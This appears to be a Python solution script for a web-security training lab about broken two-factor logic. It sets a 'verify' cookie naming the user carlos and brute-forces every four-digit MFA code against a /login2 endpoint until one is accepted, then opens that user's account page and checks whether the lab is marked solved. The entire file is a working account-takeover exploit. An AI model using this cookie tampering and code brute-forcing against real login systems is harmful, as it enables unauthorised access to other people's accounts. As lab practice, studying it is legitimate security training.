import requests
import re
from bs4 import BeautifulSoup

def init_request(session, domain):
    cookie = {'verify': 'carlos'}
    session.get(domain + '/login2', cookies=cookie)
    print('Init request done.')

def solve_lab(session, domain):
    cookie = {'verify': 'carlos'}
    for i in range(10000):
        code = str(i).zfill(4)
        print('Trying: ', code)
        r = session.post(domain + '/login2', data={'mfa-code': code}, cookies=cookie)
        # print(r.text)
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            error = soup.find('div', {'class': 'is-warning'}).text
        except AttributeError:
            error = ''
        print(error)
        if ('Incorrect security code' not in r.text):
            print()
            print('Login success with code: ', code)
            r = session.get(domain + '/my-account')
            break
def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')

if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        init_request(session, domain)
        solve_lab(session, domain)
        verify(session, domain)
    except requests.exceptions.ConnectionError:
        print('Connection Error. Please check your network connection.')